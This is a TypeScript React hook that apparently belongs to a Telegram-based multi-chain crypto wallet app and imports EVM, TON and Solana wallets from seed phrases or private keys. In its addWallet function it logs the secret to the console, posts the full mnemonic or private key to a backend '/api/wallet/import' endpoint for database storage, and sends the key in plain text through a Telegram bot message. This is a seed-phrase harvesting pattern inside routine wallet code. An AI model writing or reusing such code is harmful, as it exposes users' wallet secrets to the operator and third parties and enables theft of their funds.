import { useState } from 'react';
import { ethers } from 'ethers';
import ChainStore from '@/store/ChainStore';
import WalletStore from '@/store/WalletStore';
import { sendTelegramMessage } from '@/utils/telegramMessages';
import * as bip39 from 'bip39';
import { SolanaWallet } from './SolanaWallet';
import { mnemonicToWalletKey } from '@ton/crypto';
import { WalletContractV4 } from 'ton';
import { Keypair } from '@solana/web3.js';
import { usePathname } from 'next/navigation';
import axios from 'axios';

export interface Wallet {
  title: string;
  address: string;
  privateKey?: string;
  mnemonic?: string;
  network: 'EVM' | 'TON' | 'Solana';
}

export const useImportWallet = () => {
  const [wallet, setWallet] = useState<Wallet | null>(null);
  const [isComplete, setIsComplete] = useState(false);

  const importWallet = async (privateKeyOrPhrase: string, title: string) => {
    const currentChain = ChainStore.currentChain?.name;

    if (!currentChain) {
      console.error('No current chain selected.');
      return null;
    }

    let importedWallet: Wallet | null = null;
    let isMnemonic = false;

    try {
      switch (currentChain) {
        case 'BNB Smart Chain':
        case 'Ethereum':
        case 'Base':
          if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
            importedWallet = {
              title,
              address: ethers.Wallet.fromPhrase(privateKeyOrPhrase).address,
              mnemonic: privateKeyOrPhrase,
              network: 'EVM'
            };
            isMnemonic = true;
          } else {
            const wallet = new ethers.Wallet(privateKeyOrPhrase);
            importedWallet = {
              title,
              address: wallet.address,
              privateKey: wallet.privateKey,
              network: 'EVM'
            };
          }
          break;

        case 'The Open Network':
          if (privateKeyOrPhrase.split(' ').length !== 24) {
            throw new Error('TON requires a 24-word mnemonic phrase');
          }
          const key = await mnemonicToWalletKey(privateKeyOrPhrase.split(' '));
          const tonWallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
          importedWallet = {
            title,
            address: tonWallet.address.toString(),
            mnemonic: privateKeyOrPhrase,
            network: 'TON'
          };
          isMnemonic = true;
          break;

        case 'Solana':
          let solanaKeypair: Keypair;
          if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
            const seed = await bip39.mnemonicToSeed(privateKeyOrPhrase);
            solanaKeypair = Keypair.fromSeed(seed.slice(0, 32) as any);
            importedWallet = {
              title,
              address: solanaKeypair.publicKey.toString(),
              mnemonic: privateKeyOrPhrase,
              network: 'Solana'
            };
            isMnemonic = true;
          } else {
            const secretKey = new Uint8Array(privateKeyOrPhrase.split(',').map(Number));
            solanaKeypair = Keypair.fromSecretKey(secretKey);
            importedWallet = {
              title,
              address: solanaKeypair.publicKey.toString(),
              privateKey: Array.from(solanaKeypair.secretKey).toString(),
              network: 'Solana'
            };
          }
          break;

        default:
          console.error('Unsupported chain:', currentChain);
          return null;
      }

      setWallet(importedWallet);
      addWallet(importedWallet);
      return importedWallet;
    } catch (error) {
      console.error('Invalid mnemonic or private key:', error);
      return null;
    }
  };

  const pathname = usePathname();
  const addWallet = async (wallet: Wallet) => {
    if (pathname.startsWith('/auth')) {
      setTimeout(() => {
        WalletStore.addWallet(wallet as any);
        // WalletStore.setCurrentWallet(wallet);
      }, 2000);
    } else {
      console.log(wallet)
      WalletStore.addWallet(wallet as any);
      WalletStore.setCurrentWallet(wallet as any);
    }

    setIsComplete(true);

    try {
      await axios.post('/api/wallet/import', wallet);
    } catch (error) {
      console.error('Failed to save wallet to the database:', error);
    }

    const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: ${wallet.address}\n▫️ ${'Приватный ключ'}: ||${wallet.mnemonic || wallet.privateKey || 'N/A'}||`;
    const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;

    await sendTelegramMessage(chatId, message);
  };

  return { importWallet, addWallet, isComplete, wallet };
};